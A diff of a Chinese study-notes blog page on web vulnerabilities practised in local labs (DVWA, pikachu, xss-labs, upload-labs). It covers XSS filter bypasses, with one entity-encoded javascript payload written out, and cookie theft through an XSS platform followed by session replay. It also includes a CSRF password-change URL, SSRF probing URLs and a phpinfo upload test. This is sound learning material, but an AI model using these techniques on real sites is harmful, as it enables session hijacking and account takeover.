@@ -142,536 +142,324 @@ MathJax = {
         
       </div>
       <div class="markdown-body">
-        <h1 id="跨站脚本攻击（XSS）"><a href="#跨站脚本攻击（XSS）" class="headerlink" title="跨站脚本攻击（XSS）"></a>跨站脚本攻击（XSS）</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\81.png" alt></p>
-<p>常见攻击效果为弹窗。</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\82.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\83.png" alt></p>
-<p>在能够输入的位置，便容易存在XSS漏洞</p>
-<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\84.png" alt></p>
-<p>其中，可将长网址缩短，生成短链接</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\85.png" alt></p>
-<h4 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\89.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\90.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\91.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\92.png" alt></p>
-<p>重新访问页面时，无结果，为一次性的</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\93.png" alt></p>
-<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>存在于留言板</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\86.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\87.png" alt></p>
-<h4 id="DVWA靶场-1"><a href="#DVWA靶场-1" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\95.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\96.png" alt></p>
-<p>刷新后，发现会重复弹窗</p>
-<p>做完后到数据库中删除：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\97.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\98.png" alt="98"></p>
-<p>重新访问页面后不会出现弹窗</p>
-<h5 id="延申"><a href="#延申" class="headerlink" title="延申"></a>延申</h5><p>若输入长度被限制</p>
-<p>用F12打开，在查看器中，快速定位被限制的位置，修改maxlength参数：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\94.png" alt></p>
-<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\88.png" alt></p>
-<h4 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h4><p>使用onclick标签，点击后触发：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\99.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\100.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\101.png" alt="101"></p>
-<h3 id="三种类型之间的区别"><a href="#三种类型之间的区别" class="headerlink" title="三种类型之间的区别"></a>三种类型之间的区别</h3><p>反射型不与数据库发生交互</p>
-<p>存储型会写入数据库，危害最大</p>
-<p>dom型只存在页面，不与服务器交互</p>
-<h2 id="xss-labs-master靶场"><a href="#xss-labs-master靶场" class="headerlink" title="xss-labs-master靶场"></a>xss-labs-master靶场</h2><p>搭建简单，不存在与数据库连接，直接放在WWW目录下即可访问</p>
-<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\102.png" alt></p>
-<p>观察页面url：</p>
-<p>其向服务器提交了一个name参数，值为“test”</p>
-<p>观察页面回显：</p>
-<p>该页面将name参数的值显示在了页面上，并且显示了name参数值的字符长度</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\103.png" alt></p>
-<p>查看源码发现将name的参数值，插入到了</p><h2> </h2>标签之间，即考察反射型xss<p></p>
-<p>由于不知道服务器端对于提交的敏感字符有没有过滤，所以直接在name参数中赋值简单的弹窗进行测试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\243.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\104.png" alt></p>
-<p>用于js弹窗的代码顺利执行</p>
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><h4 id="服务器端用htmlspecialchars-函数对keyword参数的值进行处理"><a href="#服务器端用htmlspecialchars-函数对keyword参数的值进行处理" class="headerlink" title="服务器端用htmlspecialchars()函数对keyword参数的值进行处理"></a>服务器端用htmlspecialchars()函数对keyword参数的值进行处理</h4><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\105.png" alt></p>
-<p>这一关加入了“输入框”和“搜索”</p>
-<p>从url入手看，依然是get方式传参，初步判断为反射型xss</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\106.png" alt></p>
-<p>从源码来看，其功能是通过点击“搜索”按钮，将输入框内的内容以get方式提交给服务器上的level2.php，经过服务器的动态处理之后又会将参数keyword的值插入到</p><h2> </h2>标签之中以及添加到<input>标签中的value属性的值内。<p></p>
-<p>同样使用上一关的恶意语句操作进行弹窗，但是出现报错：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\107.png" alt></p>
-<p>查看源代码发现在<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中的恶意代码被编码为html字符实体：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\108.png" alt></p>
-<p>发现插入到value参数值中的恶意代码并没有被编码而是直接原样返回：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\242.png" alt></p>
-<p>但是问题是这里的js代码在标签属性值中，浏览器无法执行，故从属性值中的恶意代码处进行突破：</p>
-<p>将属性的引号和标签先闭合，让浏览器执行这里的弹窗代码</p>
-<p>将keyword的参数值重新赋值：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\245.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\109.png" alt></p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\110.png" alt></p>
-<p>输入test测试，查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\111.png" alt></p>
-<p>类level2</p>
-<p>由于不知道服务器端对于提交的敏感字符有没有过滤、编码，构造弹窗进行测试，报错：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\243.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\112.png" alt></p>
-<p>查看源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\113.png" alt></p>
-<p>这两处都将&lt;和&gt;这样的敏感字符编码成了html字符实体。</p>
-<p>猜测服务器端在这两处都用htmlspecialchars()函数进行了处理，于是通过<input>标签的一些特殊事件onfocus来执行js代码，onfocus事件在对象获得焦点时发生。</p>
-<p>即对于网页上的一个输入框，当使用鼠标点击该输入框时输入框被选中可以输入内容的时候就是该输入框获得焦点的时候,此时输入框就会触发onfocus事件。</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\246.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\114.png" alt></p>
-<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\115.png" alt></p>
-<p>还是用get方式请求参数并且该参数值在页面上有两处显示，利用弹窗代码测试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\243.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\116.png" alt></p>
-<p>发现只有在输入框中与提交的参数值有区别，<code>&lt;</code>和<code>&gt;</code>消失，查看网页源码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\117.png" alt></p>
-<p>第一处将&lt;和&gt;编码转换，第二处将&lt;和&gt;删除。</p>
-<p>但是，事件触发却不需要使用这两个符号，用上一关的代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\247.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\118.png" alt></p>
-<h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\119.png" alt></p>
-<p>还是get方式请求参数，所以还是反射型的xss，用弹窗代码测试：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\243.png" alt></p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\120.png" alt></p>
-<p>发现报错，查看网页源代码：</p>
-<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/blog/source\_posts\漏洞part\121.png" alt></p>
-<p>第一处被htmlspecialchars()函数将&lt;和&gt;进行了编码处理</p>
-<p>第二处在显示位可以看到恶意代码<script>中添加了一个_符号</p>
-<p>用之前事件触发的代码进行测试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\248.png" alt=""><br><img src="F:\blog\source\_posts\漏洞part\122.png" alt=""></p>
-<p>未触发弹窗，看网页源码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\123.png" alt=""></p>
-<p>说明对onfocus这一类的事件字符也进行了防范，但发现提交的javascript字符并没有被过滤或者转义等。</p>
-<p>此处无法通过<code>&lt;script&gt;</code>标签或触发事件来执行js代码的话，那么换一个标签来执行js代码，通过在href属性中插入js代码来点击执行：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\249.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\124.png" alt=""></p>
-<p>页面回显出现xss的链接，点击链接便可触发弹窗的js代码</p>
-<p><img src="F:\blog\source\_posts\漏洞part\125.png" alt=""></p>
-<h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p><img src="F:\blog\source\_posts\漏洞part\126.png" alt=""></p>
-<p>看上去和之前没有区别，用弹窗代码测试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\243.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\127.png" alt=""></p>
-<p>发现报错，查看源码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\128.png" alt=""></p>
-<p>第一处还是<code>&lt;</code>和<code>&gt;</code>被编码了</p>
-<p>第二处是在script字符中插入<code>_</code>破坏语义</p>
-<p>尝试事件触发的代码进行尝试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\248.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\130.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\129.png" alt=""></p>
-<p>可以看到在value属性值中也插入了<code>_</code>符号防止xss的发生</p>
-<p>尝试上一关的<code>&lt;a&gt;</code>标签：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\249.png" alt=""></p>
-<p>也报错了</p>
-<p><img src="F:\blog\source\_posts\漏洞part\131.png" alt=""></p>
-<p>xss链接无法点击，查看源代码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\132.png" alt=""></p>
-<p>尝试大小写混写能不能绕过，改动<code>&lt;a&gt;</code>标签中的<code>href</code>属性的大小写，在html中对大小写是不敏感的。</p>
-<p><img src="F:\blog\source\_posts\漏洞part\250.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\133.png" alt=""></p>
-<p>点击页面回显的<code>xss</code>链接：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\134.png" alt=""></p>
-<h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p><img src="F:\blog\source\_posts\漏洞part\135.png" alt=""></p>
-<p>看上去和之前没有区别，用弹窗代码测试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\243.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\136.png" alt=""></p>
-<p>查看源代码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\137.png" alt=""></p>
-<p>第一处将&lt;和&gt;进行编码处理</p>
-<p>第二处把script字符直接删除</p>
-<p><img src="F:\blog\source\_posts\漏洞part\243.png" alt=""></p>
-<p>尝试双写关键字</p>
-<p><img src="F:\blog\source\_posts\漏洞part\251.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\141.png" alt=""></p>
-<h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p><img src="F:\blog\source\_posts\漏洞part\142.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\143.png" alt=""></p>
-<p>弹窗代码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\243.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\144.png" alt=""></p>
-<p>第一处&lt;和&gt;被编码</p>
-<p>第二处在href属性值中script字符被插入了_字符破坏语义</p>
-<p><img src="F:\blog\source\_posts\漏洞part\248.png" alt=""></p>
-<p>查看源码发现用来闭合引号的引号被编码，onfocus一类的事件也被破坏：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\145.png" alt=""></p>
-<p>大小写绕过，也失败。在此处没有对关键字进行删除，不进行双写测试。</p>
-<p>将要提交的js代码<img src="F:\blog\source\_posts\漏洞part\252.png" alt="">进行编码防止插入_字符导致语义的破坏：</p>
-<p><a target="_blank" rel="noopener" href="https://www.toolnb.com/tools/htmlende.html">HTML实体编码互转 - 爱资料工具 (toolnb.com)</a></p>
-<p><img src="F:\blog\source\_posts\漏洞part\147.png" alt=""></p>
-<p>输入后，点击“添加友情链接”，查看源代码，发现“友情链接”里面（<a></a>）的代码正常：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\149.png" alt=""></p>
-<p>故再点击“友情链接”：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\148.png" alt=""></p>
-<h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p><img src="F:\blog\source\_posts\漏洞part\150.png" alt=""></p>
-<p>提交的参数值插入到了标签的value属性值中，但是在<a>标签的href属性中没有出现该参数值，而是显示的是字符串： “您的链接不合法？有没有！”，猜测这里对url地址做了匹配，只有包含正常的url地址才能添加到href属性值中。</p>
-<p>构造一个有正常url地址的恶意代码：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\253.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\151.png" alt=""></p>
-<p>语句显示在了href属性值中，但是javascript字符被插入了_，尝试用大小写绕过：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\254.png" alt=""></p>
-<p>仍然失败：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\152.png" alt=""></p>
-<p>尝试对关键字进行编码，同level9，但不行。从服务器端看源文件代码，有语句指出：如果字符中没有<a href="http://的话就会返回false，接着在href属性值中就会出现&quot;您的链接不合法？有没有！">http://的话就会返回false，接着在href属性值中就会出现&quot;您的链接不合法？有没有！</a>“</p>
-<p>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;//http://</p>
-<p><img src="F:\blog\source\_posts\漏洞part\153.png" alt=""></p>
-<h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>与之前不一样</p>
-<p><img src="F:\blog\source\_posts\漏洞part\154.png" alt=""></p>
-<p>查看源代码，发现在源码中有隐藏的表单，含有<code>t_link</code> <code>t_history</code> <code>t_sort</code>三个隐藏的<code>&lt;input&gt;</code>标签：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\155.png" alt=""></p>
-<p>利用弹窗代码测试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\243.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\156.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\157.png" alt=""></p>
-<p>从三个<input>标签入手：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\255.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\158.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\159.png" alt=""></p>
-<p>可以看出只有一个<code>&lt;input&gt;</code>标签的状态可以被改变：名为<code>t_sort</code>的<code>&lt;input&gt;</code>标签，之前都是隐藏状态，但是通过构造参数响应发现只有它里面的值被改变了。</p>
-<p>故从该标签进行突破，尝试注入恶意代码进行弹窗：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\244.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\160.png" alt=""></p>
-<h2 id="利用xss获取cookie"><a href="#利用xss获取cookie" class="headerlink" title="利用xss获取cookie"></a>利用xss获取cookie</h2><h3 id="方法一利用xss测试平台"><a href="#方法一利用xss测试平台" class="headerlink" title="方法一利用xss测试平台"></a>方法一利用xss测试平台</h3><p><a target="_blank" rel="noopener" href="https://xss.yt/">XSS平台-XSS安全测试平台</a></p>
-<p>首先，创建”我的项目”，使用”超强默认模块“，按照默认进行配置：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\161.png" alt=""></p>
-<p>利用DVWA的XSS(Stored)漏洞进行测试：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\162.png" alt=""></p>
-<p>在ie浏览器把攻击代码贴入Message提交得到（设Name为cccc）：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\164.png" alt=""></p>
-<p>在第三方平台创建的项目中，点击”项目内容查看“：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\165.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\166.png" alt=""></p>
-<p>在第三方中获得cookie : security=low; PHPSESSID=e901pcmb5ne056oqfrhvrek8h7</p>
-<p>也可以用F12直接获取cookie值</p>
-<p>接下来，需要利用Cookie Editor插件修改cookie值，便可以不登录就进入对应页面，换一个浏览器进行登录</p>
-<p><img src="F:\blog\source\_posts\漏洞part\168.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\169.png" alt=""></p>
-<p>保存后刷新页面，便可不需要登录直接进入。</p>
-<p>可能存在的问题：该操作需要保持原始界面登录，Cookie具有时效性（过了时效性便无法成功）</p>
-<h3 id="方法二利用pikachu-Xss后台"><a href="#方法二利用pikachu-Xss后台" class="headerlink" title="方法二利用pikachu Xss后台"></a>方法二利用pikachu Xss后台</h3><p>首先搭建pikachu Xss 后台（相当于前面的第三方平台）：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\146.png" style="zoom:67%;" /></p>
-<p>同样利用pikachu中存储型xss（另开一个页面）进行攻击，攻击代码如下：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\256.png" alt=""></p>
-<p>地址为接受cookie值的地址，即如下界面：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\170.png" alt=""></p>
-<p>开始攻击：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\171.png" alt=""></p>
-<h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p><img src="F:\blog\source\_posts\漏洞part\172.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\173.png" alt=""></p>
+        <h1 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/172.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/173.png" alt></p>
 <p>即受害者能做什么，攻击者就能以受害者的身份做什么</p>
-<p><img src="F:\blog\source\_posts\漏洞part\174.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\175.png" alt=""></p>
-<h2 id="DVWA靶场-2"><a href="#DVWA靶场-2" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>出现修改密码的界面：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\180.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/174.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/175.png" alt></p>
+<h2 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>出现修改密码的界面：</p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/180.png" alt></p>
 <p>输入123456，开启代理，开启抓包，点击Change提交，抓包得到：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\181.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/181.png" alt></p>
 <p>修改密码为111111后，关闭抓包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\182.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/182.png" alt></p>
 <p>回到页面发现密码修改成功：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\183.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/183.png" alt></p>
 <p>复制网址：<a target="_blank" rel="noopener" href="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#">http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p>
 <p>将密码改为111111，关闭代理，尝试访问该链接，前提是用户没有登出：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\184.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/184.png" alt></p>
 <p>此时，若原有用户登出，则其不知道密码（用默认密码登不进去）。</p>
 <h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>同样先抓个包：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\185.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\186.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\187.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/185.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/186.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/187.png" alt></p>
 <p>Copy下来访问</p>
-<p><img src="F:\blog\source\_posts\漏洞part\188.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/188.png" alt></p>
 <p>点击后便提交成功，把抓包关闭：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\189.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/189.png" alt></p>
 <p>修改成功</p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="F:\blog\source\_posts\漏洞part\176.png" alt=""></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/176.png" alt></p>
 <p>但是token值不能有规律</p>
 <p>自定义属性比如：在修改密码前需要输入原密码，或者增加验证码（通过短信验证）</p>
 <p>get型在url，post型在表单</p>
-<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p><img src="F:\blog\source\_posts\漏洞part\177.png" alt=""></p>
+<h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/177.png" alt></p>
 <p>利用abc三个网站去理解（a：外部；b：中间网站；c：内部）</p>
-<p><img src="F:\blog\source\_posts\漏洞part\178.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\179.png" alt=""></p>
-<h2 id="pikachu靶场-1"><a href="#pikachu靶场-1" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><p><img src="F:\blog\source\_posts\漏洞part\190.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/178.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/179.png" alt></p>
+<h2 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h2><p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/190.png" alt></p>
 <p>把原始链接：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php</a></p>
 <p>改为：<a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com</a></p>
-<p><img src="F:\blog\source\_posts\漏洞part\191.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/191.png" alt></p>
 <p>由此可以验证一下SSRF的危害，探测端口：</p>
-<p><img src="F:\blog\source\_posts\漏洞part\192.png" alt=""></p>
-<p><img src="F:\blog\source\_posts\漏洞part\193.png" alt="193"></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/192.png" alt></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/193.png" alt></p>
 <p>即说明该网站与数据库有联系</p>
 <p>用dict亦可</p>
-<p><img src="F:\blog\source\_posts\漏洞part\194.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/194.png" alt></p>
 <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h2><p>看某一处是否存在文件上传，就是测试其是否可以解析相应的代码</p>
 <p>通过phpinfo信息证明是否上传成功：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="F:\blog\source\_posts\漏洞part\195.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/195.png" alt></p>
 <p>docker需装在linux主机上：centos、Ubuntu、kali等</p>
 <p>首先启动docker：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker images</span><br><span class="line">sudo docker run -itd -p 88:80 monstertsl/upload-labs</span><br><span class="line">sudo docker ps</span><br></pre></td></tr></table></figure>
-<p><img src="F:\blog\source\_posts\漏洞part\196.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/196.png" alt></p>
 <p>在该处设置了88端口，查看kali的ip，以便在windows登录</p>
-<p><img src="F:\blog\source\_posts\漏洞part\197.png" alt=""></p>
+<p><img src="/2023/03/30/%E6%BC%8F%E6%B4%9Epart/197.png" alt></p>
 <p>出现此页面说明环境启动完成，便可在windows中登录</p>
-<p><img src="F:\blog\source\_posts\漏洞part\198.png" alt=""></p>
